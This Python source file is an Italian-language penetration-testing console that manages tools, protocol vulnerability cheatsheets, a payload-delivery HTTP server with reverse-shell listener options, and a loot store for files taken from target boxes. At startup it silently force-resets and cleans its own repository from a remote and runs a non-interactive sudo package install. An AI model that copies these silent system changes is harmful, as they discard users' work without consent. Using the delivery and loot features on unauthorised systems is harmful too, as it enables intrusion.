#!/usr/bin/env python3
from __future__ import annotations

import argparse
import importlib.util
import os
import random
import re
import platform
import select
import textwrap
import subprocess
import sys
import shlex
from dataclasses import dataclass, field
from pathlib import Path
from shutil import get_terminal_size, which

from http_server import start as _serve_start, stop as _serve_stop, status as _serve_status, fetch_tools as _serve_fetch, list_static as _serve_list_static, discover_interfaces as _serve_discover_interfaces, get_web_url as _serve_get_url, list_loot as _serve_list_loot, read_loot as _serve_read_loot, clear_loot as _serve_clear_loot, LOOT_ROOT

try:
    import readline  # type: ignore
except ImportError:
    readline = None


APP_NAME = "SeaLion Console"
VERSION = "0.1.0"
ASCII_FILE = Path(__file__).with_name("ascii-art.txt")
SEALSAY_FILE = Path(__file__).with_name("sealion_say.txt")
PROJECT_ROOT = Path(__file__).resolve().parent
TOOL_ROOT = PROJECT_ROOT / "tool"
VULN_ROOT = PROJECT_ROOT / "vuln"
NOTES_ROOT = PROJECT_ROOT / "notes"
INSTALL_ROOT = Path.home() / ".sealionconsole" / "tools"
USER_BIN = Path.home() / ".local" / "bin"
GIF_FILE = PROJECT_ROOT / "assets" / "spinning.gif"


@dataclass
class ToolEntry:
    name: str
    path: Path
    install_file: Path
    help_file: Path


@dataclass
class ConsoleState:
    current_tool: ToolEntry | None = None
    current_vuln: str | None = None
    last_search_results: list[ToolEntry] = field(default_factory=list)
    last_vuln_tools: list[str] = field(default_factory=list)
    _find_results: list = field(default_factory=list)
    _find_query: str = ""


REPO_URL = "https://github.com/Starlix27/SeaLion.git"


def auto_update() -> None:
    if not (PROJECT_ROOT / ".git").is_dir():
        return
    try:
        r = subprocess.run(
            ["git", "-C", str(PROJECT_ROOT), "fetch", "--force", REPO_URL, "main"],
            capture_output=True, text=True, timeout=15,
        )
        if r.returncode != 0:
            return
        local = subprocess.run(
            ["git", "-C", str(PROJECT_ROOT), "rev-parse", "HEAD"],
            capture_output=True, text=True,
        ).stdout.strip()
        remote = subprocess.run(
            ["git", "-C", str(PROJECT_ROOT), "rev-parse", "FETCH_HEAD"],
            capture_output=True, text=True,
        ).stdout.strip()
        if not remote or local == remote:
            return
        subprocess.run(
            ["git", "-C", str(PROJECT_ROOT), "checkout", "."],
            capture_output=True, text=True, timeout=10,
        )
        subprocess.run(
            ["git", "-C", str(PROJECT_ROOT), "reset", "--hard", "FETCH_HEAD"],
            capture_output=True, text=True, timeout=15,
        )
        subprocess.run(
            ["git", "-C", str(PROJECT_ROOT), "clean", "-fd"],
            capture_output=True, text=True, timeout=10,
        )
        print(f"\033[92m[update]\033[0m Aggiornato a {remote[:7]}")
    except Exception:
        pass


def _auto_install_deps() -> None:
    if not is_linux():
        return
    missing = [pkg for pkg in ["chafa"] if not which(pkg)]
    if not missing:
        return
    try:
        subprocess.run(
            ["sudo", "-n", "apt", "install", "-y"] + missing,
            capture_output=True, timeout=30,
        )
    except Exception:
        pass


def load_logo() -> str:
    if ASCII_FILE.exists():
        content = ASCII_FILE.read_text(encoding="utf-8", errors="replace").rstrip()
        if content:
            return content
    return APP_NAME


def load_sealsay_art() -> str:
    if SEALSAY_FILE.exists():
        content = SEALSAY_FILE.read_text(encoding="utf-8", errors="replace").rstrip()
        if content:
            return content
    return load_logo()


def normalize(value: str) -> str:
    return value.strip().lower()


def is_linux() -> bool:
    return platform.system().lower() == "linux"


def discover_tools() -> list[ToolEntry]:
    tools: list[ToolEntry] = []
    for path in sorted(TOOL_ROOT.iterdir(), key=lambda p: p.name.lower()):
        if not path.is_dir() or path.name.startswith(".") or path.name.startswith("__"):
            continue
        install_file = path / "install.py"
        help_file = path / "help.md"
        if not help_file.exists():
            help_file = path / "help.txt"
        if install_file.exists() and help_file.exists():
            tools.append(ToolEntry(name=path.name, path=path, install_file=install_file, help_file=help_file))
    return tools


def find_tool(name: str) -> ToolEntry | None:
    needle = normalize(name)
    for tool in discover_tools():
        if normalize(tool.name) == needle:
            return tool
    return None


def _paged_print(lines: list[str], page_size: int = 30) -> None:
    if not sys.stdin.isatty() or len(lines) <= page_size:
        print("\n".join(lines))
        return
    import tty, termios
    pos = 0
    total = len(lines)
    fd = sys.stdin.fileno()
    old = termios.tcgetattr(fd)

    def show_page():
        end = min(pos + page_size, total)
        for line in lines[pos:end]:
            print(line)
        remaining = total - end
        if remaining > 0:
            sys.stdout.write(f"\033[93m--- ↓ continua ({remaining} righe) · Q esci ---\033[0m")
            sys.stdout.flush()

    show_page()
    while pos + page_size < total:
        try:
            tty.setraw(fd)
            ch = sys.stdin.read(1)
            if ch == "\x1b":
                ch2 = sys.stdin.read(1)
                if ch2 == "[":
                    ch3 = sys.stdin.read(1)
                    if ch3 in ("B", "C"):
                        termios.tcsetattr(fd, termios.TCSADRAIN, old)
                        sys.stdout.write("\r\033[K")
                        sys.stdout.flush()
                        pos += page_size
                        show_page()
                        continue
                else:
                    termios.tcsetattr(fd, termios.TCSADRAIN, old)
                    sys.stdout.write("\r\033[K")
                    sys.stdout.flush()
                    return
            elif ch in ("q", "Q"):
                termios.tcsetattr(fd, termios.TCSADRAIN, old)
                sys.stdout.write("\r\033[K")
                sys.stdout.flush()
                return
        finally:
            termios.tcsetattr(fd, termios.TCSADRAIN, old)


def render_markdown(text: str) -> None:
    try:
        from rich.console import Console
        from rich.markdown import Markdown
        from io import StringIO
        buf = StringIO()
        console = Console(file=buf, force_terminal=True)
        console.print(Markdown(text))
        rendered = buf.getvalue()
    except ImportError:
        rendered = text
    _paged_print(rendered.splitlines())


TIPS_FILE = Path(__file__).with_name("tips.txt")


def load_tips() -> list[str]:
    if TIPS_FILE.exists():
        return [l for l in TIPS_FILE.read_text(encoding="utf-8", errors="replace").splitlines() if l.strip()]
    return ["SeaLion"]


def print_banner() -> None:
    tip = random.choice(load_tips())
    print_sealsay(tip)
    print(f"\n{APP_NAME} — personal tool vault\n")


def _read_sealsay_message(argv: list[str]) -> str:
    if argv:
        return " ".join(argv).strip()

    if not sys.stdin.isatty():
        piped = sys.stdin.read().strip()
        if piped:
            return piped

    return "SeaLion"


def _build_sealsay_bubble(message: str, max_width: int = 40) -> list[str]:
    wrapped: list[str] = []
    for raw_line in message.splitlines() or [""]:
        if len(raw_line) <= max_width:
            wrapped.append(raw_line)
        else:
            wrapped.extend(textwrap.wrap(raw_line, width=max_width) or [""])
    width = max(len(line) for line in wrapped)
    bubble: list[str] = []
    bubble.append(f" .{'─' * (width + 2)}.")
    for line in wrapped:
        bubble.append(f"│  {line.ljust(width)} │")
    bubble.append(f" '{'─' * (width + 2)}'")
    bubble.append(f"/")
    return bubble


def print_sealsay(message: str) -> None:
    art_lines = load_sealsay_art().splitlines()
    art_width = max(len(l) for l in art_lines) if art_lines else 0

    term_width = get_terminal_size((80, 24)).columns
    bubble_decoration = 6  # "│  " + " │"
    max_text = max(20, term_width - art_width - 2 - bubble_decoration)

    bubble_lines = _build_sealsay_bubble(message, max_width=max_text)
    bubble_height = len(bubble_lines)

    mouth_row = 6
    bubble_start = max(0, mouth_row - bubble_height)

    total = max(len(art_lines), bubble_start + bubble_height)
    for i in range(total):
        art_part = art_lines[i] if i < len(art_lines) else ""
        bubble_idx = i - bubble_start
        if 0 <= bubble_idx < bubble_height:
            print(f"{art_part:<{art_width}}  {bubble_lines[bubble_idx]}")
        else:
            print(art_part)


def cmd_sealsay(args: argparse.Namespace, state: ConsoleState | None = None) -> int:
    message = _read_sealsay_message(getattr(args, "message", []))
    print_sealsay(message)
    return 0


def print_tool_help(tool: ToolEntry) -> None:
    text = tool.help_file.read_text(encoding="utf-8", errors="replace").rstrip()
    _print_web_link("tools", tool.name)
    render_markdown(text)


def print_tool_entry(tool: ToolEntry, index: int | None = None) -> None:
    if index is None:
        print(f"  - {tool.name}")
    else:
        print(f"  [{index}] {tool.name}")


def print_help_text() -> None:
    print()
    print("Comandi disponibili:")
    print("  list               Elenca i tool disponibili")
    print("  use <nome|num>     Seleziona un tool")
    print("  install [nome]     Installa il tool selezionato o specificato")
    print("  search <query>     Cerca tool per nome o testo")
    print("  find <parola>      Cerca un testo in vuln, tool e notes")
    print("  vuln <protocollo>  Mostra cheatsheet  (vuln list per elenco)")
    print("  notes <argomento>  Mostra una guida    (notes list per elenco)")
    print("  serve <azione>     Server HTTP di delivery (serve help per dettagli)")
    print("  serve list         Elenca i file in static/")
    print("  loot [azione]      Gestisci file ricevuti dalla vulnbox (loot help)")
    print("  wordfind [url]     Wizard wordlist per fuzzing/bruteforce")
    print("  passfind           Wizard password cracking (hash, file, archivi, servizi)")
    print("  sealsay [testo]    Stampa un messaggio in stile cowsay")
    print("  back               Torna alla console principale")
    print("  help               Mostra questo aiuto")
    print()
    print("  \033[1mESC\033[0m                Esci da " + APP_NAME)
    print("  \033[1mCtrl+C\033[0m             \033[95m~spin~\033[0m")


def get_install_dir(tool: ToolEntry) -> Path:
    return INSTALL_ROOT / tool.name


def load_install_module(tool: ToolEntry):
    spec = importlib.util.spec_from_file_location(f"sealionconsole_install_{tool.name}", tool.install_file)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


def run_install(tool: ToolEntry) -> int:
    if not is_linux():
        print(f" {tool.name} è disponibile solo su Linux.", file=sys.stderr)
        return 1

    install_dir = get_install_dir(tool)
    install_dir.mkdir(parents=True, exist_ok=True)

    print(f"\nInstallazione di {tool.name}…")
    print(f"Destinazione: {install_dir}\n")

    try:
        mod = load_install_module(tool)
        rc = mod.install(install_dir)
    except Exception as exc:
        print(f"Errore durante l'installazione: {exc}", file=sys.stderr)
        return 1

    if rc != 0:
        return rc

    entry_point = getattr(mod, "ENTRY_POINT", None)
    if entry_point:
        publish_launcher(tool, install_dir, entry_point)

    return 0


def publish_launcher(tool: ToolEntry, install_dir: Path, entry_point_template: str) -> None:
    command = entry_point_template.format(dest=install_dir)

    USER_BIN.mkdir(parents=True, exist_ok=True)
    launcher_path = USER_BIN / tool.name
    launcher_body = (
        "#!/usr/bin/env bash\n"
        "set -euo pipefail\n"
        f'exec {command} "$@"\n'
    )
    launcher_path.write_text(launcher_body, encoding="utf-8")
    launcher_path.chmod(0o755)
    print(f"\nLauncher creato: {launcher_path}")

    if str(USER_BIN) not in (subprocess.run(["bash", "-lc", "echo $PATH"], capture_output=True, text=True).stdout or ""):
        print(f"  Assicurati che {USER_BIN} sia nel tuo PATH.")


def print_tool_context(tool: ToolEntry) -> None:
    print(f"\n--- {tool.name} ---")
    print(f"Cartella sorgente:       {tool.path}")
    print(f"Cartella installazione:  {get_install_dir(tool)}")
    print()
    print_tool_help(tool)
    print("\nDigita 'install' per installare, 'back' per tornare indietro.")


def tool_match_score(tool: ToolEntry, query: str) -> tuple[int, str]:
    """Return (score, reason) — lower score = better match. -1 = no match."""
    nq = normalize(query)
    name = normalize(tool.name)
    if name.startswith(nq):
        return (0, "nome")
    if nq in name:
        return (1, "nome")
    help_text = tool.help_file.read_text(encoding="utf-8", errors="replace")
    if nq in help_text.lower():
        for line in help_text.splitlines():
            if nq in line.lower():
                snippet = line.strip()
                if len(snippet) > 80:
                    snippet = snippet[:77] + "..."
                return (2, snippet)
        return (2, "menzionato nel help")
    return (-1, "")


def resolve_target(target: str | None, state: ConsoleState | None) -> ToolEntry | None:
    if target is None:
        return state.current_tool if state is not None else None

    if target.isdigit() and state is not None:
        if state.current_vuln and state.last_vuln_tools:
            index = int(target) - 1
            if 0 <= index < len(state.last_vuln_tools):
                return find_tool(state.last_vuln_tools[index])
        tools = discover_tools()
        if state.last_search_results:
            tools = state.last_search_results
        index = int(target) - 1
        if 0 <= index < len(tools):
            return tools[index]

    return find_tool(target)


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(prog="slconsole", add_help=False)
    parser.add_argument("-h", "--help", action="store_true")
    parser.add_argument("--version", action="store_true")
    subparsers = parser.add_subparsers(dest="command")
    sealsay_p = subparsers.add_parser("sealsay")
    sealsay_p.add_argument("message", nargs="*")
    subparsers.add_parser("list")
    install_p = subparsers.add_parser("install")
    install_p.add_argument("target", nargs="?")
    use_p = subparsers.add_parser("use")
    use_p.add_argument("target")
    subparsers.add_parser("back")
    search_p = subparsers.add_parser("search")
    search_p.add_argument("query", nargs="+")
    vuln_p = subparsers.add_parser("vuln")
    vuln_p.add_argument("protocol", nargs="+")
    notes_p = subparsers.add_parser("notes")
    notes_p.add_argument("topic", nargs="+")
    find_p = subparsers.add_parser("find")
    find_p.add_argument("query", nargs="+")
    serve_p = subparsers.add_parser("serve", add_help=False)
    serve_p.add_argument("action", nargs="?", default="status")
    serve_p.add_argument("subtopic", nargs="?", default=None)
    serve_p.add_argument("--port", type=int, default=2727)
    serve_p.add_argument("--lhost", default=None)
    serve_p.add_argument("--lport", type=int, default=4444)
    serve_p.add_argument("--force", action="store_true", default=False)
    loot_p = subparsers.add_parser("loot", add_help=False)
    loot_p.add_argument("action", nargs="?", default="list")
    loot_p.add_argument("target", nargs="?", default=None)
    wordfind_p = subparsers.add_parser("wordfind", add_help=False)
    wordfind_p.add_argument("url", nargs="?", default=None)
    subparsers.add_parser("passfind", add_help=False)
    return parser


def parse_console_command(line: str) -> list[str]:
    tokens = shlex.split(line)
    if tokens and tokens[0].lower() in {"slconsole", "sealion", "sealionconsole"}:
        return tokens[1:]
    return tokens


def setup_readline() -> None:
    pass


_COMPLETABLE = sorted(["sealsay", "list", "install", "use", "search", "vuln",
                        "notes", "find", "back", "help", "serve", "loot", "wordfind", "passfind", "exit"])
_input_history: list[str] = []


def _play_ctrlc_gif() -> None:
    if not GIF_FILE.exists():
        print("\033[93m[!]\033[0m GIF non trovata in assets/spinning.gif")
        return

    cols, rows = get_terminal_size((80, 24))
    h = max(10, rows - 2)

    renderer = which("chafa") or which("img2txt")
    if not renderer:
        print("\033[93m[!]\033[0m Installa chafa per la GIF: sudo apt install chafa")
        return

    sys.stdout.write("\033[?1049h\033[H")
    sys.stdout.flush()

    try:
        if "chafa" in renderer:
            cmd = ["chafa", "-w", "9",
                   "-s", f"{cols}x{h}", "--duration=inf", str(GIF_FILE)]
            proc = subprocess.Popen(cmd, stderr=subprocess.DEVNULL)
            proc.wait()
        else:
            while True:
                proc = subprocess.Popen(
                    ["img2txt", "-W", str(cols), "-H", str(h), str(GIF_FILE)],
                    stderr=subprocess.DEVNULL,
                )
                proc.wait()
    except KeyboardInterrupt:
        try:
            proc.terminate()
            proc.wait(timeout=1)
        except Exception:
            pass
    finally:
        sys.stdout.write("\033[?1049l")
        sys.stdout.flush()


def _smart_input(prompt: str) -> str | None:
    """Input interattivo: ESC=esci, Ctrl+C=GIF. Ritorna None su ESC."""
    if not sys.stdin.isatty():
        try:
            return input(prompt)
        except EOFError:
            return None

    import tty, termios

    sys.stdout.write(prompt)
    sys.stdout.flush()

    fd = sys.stdin.fileno()
    old = termios.tcgetattr(fd)
    buf: list[str] = []
    pos = 0
    hist_idx = len(_input_history)
    saved_buf: list[str] = []

    def refresh() -> None:
        text = "".join(buf)
        sys.stdout.write(f"\r\033[K{prompt}{text}")
        back = len(buf) - pos
        if back > 0:
            sys.stdout.write(f"\033[{back}D")
        sys.stdout.flush()

    try:
        tty.setraw(fd)
        while True:
            ch = sys.stdin.read(1)

            if ch == "\x1b":
                ch2 = sys.stdin.read(1)
                if ch2 == "[":
                    ch3 = sys.stdin.read(1)
                    if ch3 == "A" and _input_history:
                        if hist_idx > 0:
                            if hist_idx == len(_input_history):
                                saved_buf = list(buf)
                            hist_idx -= 1
                            buf = list(_input_history[hist_idx])
                            pos = len(buf)
                            refresh()
                    elif ch3 == "B":
                        if hist_idx < len(_input_history):
                            hist_idx += 1
                            buf = list(saved_buf) if hist_idx == len(_input_history) else list(_input_history[hist_idx])
                            pos = len(buf)
                            refresh()
                    elif ch3 == "C" and pos < len(buf):
                        pos += 1
                        sys.stdout.write("\033[C")
                        sys.stdout.flush()
                    elif ch3 == "D" and pos > 0:
                        pos -= 1
                        sys.stdout.write("\033[D")
                        sys.stdout.flush()
                    elif ch3 == "H":
                        pos = 0
                        refresh()
                    elif ch3 == "F":
                        pos = len(buf)
                        refresh()
                    elif ch3 == "3":
                        if select.select([sys.stdin], [], [], 0.2)[0]:
                            sys.stdin.read(1)
                        if pos < len(buf):
                            buf.pop(pos)
                            refresh()
                elif ch2 == "\x1b":
                    sys.stdout.write("\r\n")
                    sys.stdout.flush()
                    return None

            elif ch == "\x03":
                sys.stdout.write("\r\n")
                sys.stdout.flush()
                raise KeyboardInterrupt

            elif ch in ("\r", "\n"):
                sys.stdout.write("\r\n")
                sys.stdout.flush()
                line = "".join(buf)
                if line.strip():
                    _input_history.append(line)
                return line

            elif ch in ("\x7f", "\x08"):
                if pos > 0:
                    buf.pop(pos - 1)
                    pos -= 1
                    refresh()

            elif ch == "\x04":
                if not buf:
                    sys.stdout.write("\r\n")
                    sys.stdout.flush()
                    return None

            elif ch == "\x15":
                buf = buf[pos:]
                pos = 0
                refresh()

            elif ch == "\x0b":
                buf = buf[:pos]
                refresh()

            elif ch == "\x17":
                while pos > 0 and buf[pos - 1] == " ":
                    buf.pop(pos - 1); pos -= 1
                while pos > 0 and buf[pos - 1] != " ":
                    buf.pop(pos - 1); pos -= 1
                refresh()

            elif ch == "\x01":
                pos = 0
                refresh()

            elif ch == "\x05":
                pos = len(buf)
                refresh()

            elif ch == "\x0c":
                sys.stdout.write("\033[2J\033[H")
                refresh()

            elif ch == "\t":
                partial = "".join(buf[:pos]).lstrip()
                if partial and " " not in partial:
                    matches = [c for c in _COMPLETABLE if c.startswith(partial.lower())]
                    if len(matches) == 1:
                        tail = matches[0][len(partial):] + " "
                        for c in tail:
                            buf.insert(pos, c); pos += 1
                        refresh()
                    elif matches:
                        sys.stdout.write("\r\n  " + "  ".join(matches) + "\r\n")
                        refresh()

            elif 32 <= ord(ch) < 127:
                buf.insert(pos, ch)
                pos += 1
                refresh()

    finally:
        termios.tcsetattr(fd, termios.TCSADRAIN, old)


def run_command(argv: list[str], state: ConsoleState | None = None) -> int:
    parser = build_parser()
    try:
        args = parser.parse_args(argv)
    except SystemExit:
        return 1

    if args.version:
        print(f"{APP_NAME} {VERSION}")
        return 0

    if args.help or args.command is None:
        print_help_text()
        return 0

    handlers = {
        "sealsay": cmd_sealsay,
        "list": cmd_list,
        "install": cmd_install,
        "use": cmd_use,
        "back": cmd_back,
        "search": cmd_search,
        "vuln": cmd_vuln,
        "notes": cmd_notes,
        "find": cmd_find,
        "serve": cmd_serve,
        "loot": cmd_loot,
        "wordfind": cmd_wordfind,
        "passfind": cmd_passfind,
    }
    handler = handlers.get(args.command)
    if handler is None:
        print_help_text()
        return 1
    return handler(args, state)


def _autostart_server() -> None:
    """Ask for network interface and start the HTTP server automatically."""
    ifaces = _serve_discover_interfaces()
    if not ifaces:
        print("\033[93m[!]\033[0m Nessuna interfaccia di rete trovata, server non avviato.")
        return

    if len(ifaces) == 1:
        lhost = ifaces[0][1]
    else:
        print("\n  Interfacce disponibili:\n")
        for i, (name, addr) in enumerate(ifaces, 1):
            print(f"    [{i}] {name:<12s}  {addr}")
        print()
        while True:
            try:
                choice = input("  Scegli interfaccia per il server [1]: ").strip()
            except (EOFError, KeyboardInterrupt):
                print()
                return
            if not choice:
                choice = "1"
            if choice.isdigit() and 1 <= int(choice) <= len(ifaces):
                lhost = ifaces[int(choice) - 1][1]
                break
            print(f"  Inserisci un numero da 1 a {len(ifaces)}.")

    result = _serve_start(lhost=lhost)
    for line in result.splitlines():
        print(f"  {line}")
    print()


def run_console() -> int:
    state = ConsoleState()
    _autostart_server()
    print_banner()
    url = _serve_get_url()
    if url:
        print(f"  \033[96mSLWeb:\033[0m {url}")
    print("Digita 'help' per i comandi, \033[1mESC\033[0m per uscire.")
    while True:
        prompt = f"\033[94mConsole({state.current_tool.name})> \033[0m" if state.current_tool else f"\033[94mslconsole({state.current_vuln})> \033[0m" if state.current_vuln else "\033[94mslconsole> \033[0m"
        try:
            line = _smart_input(prompt)
        except KeyboardInterrupt:
            _play_ctrlc_gif()
            continue

        if line is None:
            print("**Auh! Auh! Ouh!**")
            return 0

        line = line.strip()
        if not line:
            continue

        lowered = line.lower()
        if lowered in {"exit", "quit"}:
            return 0
        if lowered in {"help", "?"}:
            if state.current_tool:
                print_tool_context(state.current_tool)
            else:
                print_help_text()
            continue
        if lowered == "back":
            state.current_tool = None
            state.current_vuln = None
            state.last_vuln_tools = []
            state._find_results = []
            state._find_query = ""
            print("Tornato alla console principale.")
            continue

        argv = parse_console_command(line)
        if not argv:
            continue

        if argv[0] == "serve" and len(argv) >= 2 and argv[1] in {"-h", "--help"}:
            argv = ["serve", "help"] + argv[2:]

        if state.current_tool is not None and argv[0] == "install" and len(argv) == 1:
            rc = run_install(state.current_tool)
            if rc != 0:
                print(f"Installazione terminata con errore (codice {rc}).")
            continue

        if argv[0] == "use" and len(argv) == 2 and argv[1].isdigit() and state._find_results:
            idx = int(argv[1]) - 1
            if 0 <= idx < len(state._find_results):
                src, label, file_path, _ = state._find_results[idx]
                section_map = {"vuln": "vuln", "tool": "tools", "notes": "notes"}
                _print_web_link(section_map.get(src, src), file_path.stem if src != "tool" else label)
                text = file_path.read_text(encoding="utf-8", errors="replace")
                _render_highlighted(text, state._find_query)
                if src == "tool":
                    tool = find_tool(label)
                    if tool:
                        state.current_tool = tool
                        state.current_vuln = None
                        state.last_vuln_tools = []
                elif src == "vuln":
                    state.current_vuln = file_path.stem
                    state.current_tool = None
                    state.last_vuln_tools = _extract_vuln_tools(text)
                continue

        known_commands = {"sealsay", "list", "install", "use", "search", "vuln", "notes", "find", "back", "help", "?", "--version", "-h", "--help", "serve", "loot", "wordfind", "passfind"}
        if argv[0] not in known_commands:
            print("Comando non riconosciuto. Digita 'help' per i comandi.")
            continue

        rc = run_command(argv, state)
        if rc != 0 and rc != 1:
            print(f"Comando terminato con codice {rc}.")


def cmd_list(args: argparse.Namespace, state: ConsoleState | None = None) -> int:
    tools = discover_tools()
    if not tools:
        print("Nessun tool trovato.")
        print("Per aggiungere un tool, crea una cartella con install.py e help.md.")
        return 0
    print(f"\nTool disponibili ({len(tools)}):\n")
    for index, tool in enumerate(tools, start=1):
        print_tool_entry(tool, index)
    print()
    return 0


def _read_key() -> str:
    import tty, termios
    fd = sys.stdin.fileno()
    old = termios.tcgetattr(fd)
    try:
        tty.setraw(fd)
        ch = sys.stdin.read(1)
        if ch == "\x1b":
            ch2 = sys.stdin.read(1)
            if ch2 == "[":
                ch3 = sys.stdin.read(1)
                if ch3 == "C":
                    return "right"
                if ch3 == "D":
                    return "left"
            return "esc"
        if ch in ("\r", "\n"):
            return "enter"
        if ch == "q":
            return "quit"
        return ch
    finally:
        termios.tcsetattr(fd, termios.TCSADRAIN, old)


PAGE_SIZE = 5


def _highlight_name(name: str, query: str) -> str:
    """Highlight the query substring in the tool name with blue+bold."""
    lower = name.lower()
    ql = query.lower()
    idx = lower.find(ql)
    if idx >= 0:
        return name[:idx] + f"\033[94;1m{name[idx:idx+len(ql)]}\033[0m" + name[idx+len(ql):]
    return name


def _print_search_page(results: list[tuple], query: str, page: int) -> int:
    total = len(results)
    total_pages = (total + PAGE_SIZE - 1) // PAGE_SIZE
    start = page * PAGE_SIZE
    end = min(start + PAGE_SIZE, total)
    print(f"\033[2J\033[H", end="")
    print(f"\n  \033[1mRicerca:\033[0m '\033[94m{query}\033[0m'  —  {total} risultat{'o' if total == 1 else 'i'}\n")

    for i in range(start, end):
        tool, score, reason = results[i]
        highlighted = _highlight_name(tool.name, query)
        if score <= 1:
            print(f"  \033[92m[{i+1}]\033[0m {highlighted}")
        else:
            print(f"  \033[93m[{i+1}]\033[0m {highlighted}")
            print(f"       \033[2m↳ {reason}\033[0m")

    print()
    if total_pages > 1:
        bar = ""
        for p in range(total_pages):
            if p == page:
                bar += f" \033[94;1m[{p+1}]\033[0m"
            else:
                bar += f" \033[2m {p+1} \033[0m"
        print(f"  {bar}   \033[2m← → naviga · q esci\033[0m\n")
    else:
        print(f"  \033[2mDigita 'use <num>' per aprire un tool.\033[0m\n")
    return total_pages


def cmd_search(args: argparse.Namespace, state: ConsoleState | None = None) -> int:
    query = " ".join(args.query) if isinstance(args.query, list) else args.query
    query = normalize(query)
    scored = [(t, *tool_match_score(t, query)) for t in discover_tools()]
    matches = sorted([(t, s, r) for t, s, r in scored if s >= 0], key=lambda x: x[1])
    if not matches:
        print("Nessun risultato.")
        return 0
    results = matches
    if state is not None:
        state.last_search_results = [t for t, _, _ in results]

    total_pages = _print_search_page(results, query, 0)
    if total_pages <= 1:
        return 0

    page = 0
    interactive = sys.stdin.isatty()
    if not interactive:
        return 0

    while True:
        key = _read_key()
        if key == "right" and page < total_pages - 1:
            page += 1
            _print_search_page(results, query, page)
        elif key == "left" and page > 0:
            page -= 1
            _print_search_page(results, query, page)
        elif key in ("quit", "esc", "enter"):
            break
    return 0


def cmd_use(args: argparse.Namespace, state: ConsoleState | None = None) -> int:
    if state is None:
        print("Il comando 'use' è disponibile solo nella console interattiva.", file=sys.stderr)
        return 1
    tool = resolve_target(args.target, state)
    if not tool:
        print(f"Tool non trovato: {args.target}", file=sys.stderr)
        return 1
    state.current_tool = tool
    state.current_vuln = None
    state.last_vuln_tools = []
    print_tool_context(tool)
    return 0


def cmd_back(args: argparse.Namespace, state: ConsoleState | None = None) -> int:
    if state is None:
        return 0
    state.current_tool = None
    state.current_vuln = None
    state.last_vuln_tools = []
    print("Tornato alla console principale.")
    return 0


def cmd_install(args: argparse.Namespace, state: ConsoleState | None = None) -> int:
    target = getattr(args, "target", None)
    tool = resolve_target(target, state)
    if not tool:
        print("Nessun tool selezionato. Usa 'install <nome>' oppure prima 'use <nome>'.", file=sys.stderr)
        return 1
    return run_install(tool)


# ---------------------------------------------------------------------------
# vuln command — vulnerability cheatsheets per protocollo (file-based)
# ---------------------------------------------------------------------------

VULN_CATEGORIES: dict[str, list[str]] = {
    "Trasferimento File": ["ftp", "smb", "nfs"],
    "DNS & Ricognizione": ["dns"],
    "Email": ["smtp", "imap-pop3"],
    "Monitoraggio Rete": ["snmp"],
    "Database": ["mysql", "mssql", "oracle-tns"],
    "Accesso Remoto": ["ssh", "rdp", "winrm", "wmi"],
    "Hardware & Management": ["ipmi"],
}

VULN_ALIASES: dict[str, str] = {
    "imap": "imap-pop3", "pop3": "imap-pop3", "pop": "imap-pop3",
    "imap pop3": "imap-pop3", "imap/pop3": "imap-pop3", "dovecot": "imap-pop3",
    "oracle": "oracle-tns", "tns": "oracle-tns", "oracletns": "oracle-tns", "oracle tns": "oracle-tns",
    "samba": "smb", "cifs": "smb", "netbios": "smb", "rpc": "smb",
    "ftps": "ftp", "tftp": "ftp", "sftp": "ftp", "vsftpd": "ftp",
    "bind": "dns", "bind9": "dns", "nslookup": "dns", "dig": "dns",
    "sshd": "ssh", "openssh": "ssh",
    "mstsc": "rdp", "xfreerdp": "rdp", "rdesktop": "rdp",
    "idrac": "ipmi", "ilo": "ipmi", "bmc": "ipmi",
    "postfix": "smtp", "sendmail": "smtp",
    "nfsd": "nfs", "portmapper": "nfs",
    "mssqlserver": "mssql", "sqlserver": "mssql",
    "mariadb": "mysql", "mysqld": "mysql",
}

VULN_NAMES: dict[str, str] = {
    "ftp": "FTP — File Transfer Protocol",
    "smb": "SMB — Server Message Block",
    "nfs": "NFS — Network File System",
    "dns": "DNS — Domain Name System",
    "smtp": "SMTP — Simple Mail Transfer Protocol",
    "imap-pop3": "IMAP/POP3 — Protocolli di lettura email",
    "snmp": "SNMP — Simple Network Management Protocol",
    "mysql": "MySQL — Database Relazionale",
    "mssql": "MSSQL — Microsoft SQL Server",
    "oracle-tns": "Oracle TNS — Transparent Network Substrate",
    "ipmi": "IPMI — Intelligent Platform Management Interface",
    "ssh": "SSH — Secure Shell",
    "rdp": "RDP — Remote Desktop Protocol",
    "winrm": "WinRM — Windows Remote Management",
    "wmi": "WMI — Windows Management Instrumentation",
}


NOTES_CATEGORIES: dict[str, list[str]] = {
    "Metodologia": ["footprinting", "info-gathering"],
    "Offensive": ["shells", "password-cracking", "network-services"],
    "Protocolli": ["ssh-notes", "impacket-notes"],
    "Sistemi Operativi": ["windows-powershell"],
}

NOTES_NAMES: dict[str, str] = {
    "footprinting": "Footprinting — Metodologia di Enumerazione",
    "info-gathering": "Information Gathering — Ricognizione",
    "shells": "Shell & Post-Exploitation — Reverse, Bind, Web Shell, PrivEsc",
    "password-cracking": "Password Cracking — JtR & Hashcat",
    "network-services": "Network Services — WinRM, SSH, RDP, SMB",
    "ssh-notes": "SSH — Note Operative",
    "impacket-notes": "Impacket — Toolkit Python per reti Windows",
    "windows-powershell": "Windows PowerShell — Comandi Facili con Equivalenti Linux",
}


def discover_vulns() -> list[str]:
    if not VULN_ROOT.is_dir():
        return []
    return sorted(p.stem for p in VULN_ROOT.glob("*.md"))


def discover_notes() -> list[str]:
    if not NOTES_ROOT.is_dir():
        return []
    return sorted(p.stem for p in NOTES_ROOT.glob("*.md"))


def _extract_vuln_tools(md_text: str) -> list[str]:
    tools: list[str] = []
    in_section = False
    for line in md_text.splitlines():
        if line.startswith("## Tool consigliati"):
            in_section = True
            continue
        if in_section:
            if line.startswith("## "):
                break
            stripped = line.strip()
            if stripped.startswith("- **") and "**" in stripped[4:]:
                name = stripped[4:stripped.index("**", 4)]
                tools.append(name)
    return tools


def cmd_vuln(args: argparse.Namespace, state: ConsoleState | None = None) -> int:
    raw = " ".join(args.protocol) if isinstance(args.protocol, list) else args.protocol
    key = normalize(raw)

    if key in {"list", "*", "all"}:
        md_parts = ["# Protocolli disponibili\n"]
        available = set(discover_vulns())
        for cat_name, cat_protos in VULN_CATEGORIES.items():
            cat_items = [p for p in cat_protos if p in available]
            if not cat_items:
                continue
            md_parts.append(f"## {cat_name}\n")
